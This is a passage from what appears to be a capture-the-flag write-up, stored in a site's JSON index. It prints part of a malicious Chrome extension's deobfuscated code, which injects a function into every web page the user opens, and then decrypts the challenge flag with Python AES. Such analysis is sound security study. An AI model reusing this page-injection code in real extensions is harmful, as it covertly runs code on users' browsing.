16)))), {['name']: 'AES-CBC'}, true, ['encrypt']), j))]['map'](x =&gt; x['toString'](16)['padStart'](2, \"0\"))['join'](\"\"));       }     }, 1);   } } ;  chrome['tabs']['onUpdated']['addListener']((tabVar, changeInfo, tab) =&gt; {   if ('url' in tab &amp;&amp; tab['url'] != null &amp;&amp; (tab['url']['startsWith']('https://') || tab['url']['startsWith']('http://'))) {     chrome['scripting']['executeScript']({['target']: {['tabId']: tab['id']}, function: iF});   } });   2. Decrypt with AES-256  &gt;&gt;&gt; from Crypto.Cipher import AES &gt;&gt;&gt; AES.new(b'_NOT_THE_SECRET_',AES.MODE_CBC,b'_NOT_THE_SECRET_') &lt;Crypto.Cipher.AES.AESCipher object at 0x7fae19feb790&gt; &gt;&gt;&gt; cipher = AES.new(b'_NOT_THE_SECRET_',AES.MODE_CBC,b'_NOT_THE_SECRET_') &gt;&gt;&gt; cipher.decrypt(b'\\xe2B\\xe6Ba\\xd2\\x19i\\xf6[\\xed\\xf9T\\x90\\n\\x99R\\t\\t\\x9f\\xb6\\xc3\\xc6\\x82\\xc0\\xd9\\xc4\\xb2u\\xb1\\xc2\\x12\\xbc\\x18\\x8e\\x08\\x82\\xb6\\xber\\xc7I!\\x12A\\x18\\x7f\\xa8') b'HTB{__mY_vRy_owN_CHR0me_M1N3R__}\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10'     FOR : Linaâ€™s Invitation  writingâ€¦.  ","categories": ["ctf"],
        "tags": [],
        "url": "/ctf/ctf_test/",
        "teaser": null
      }]
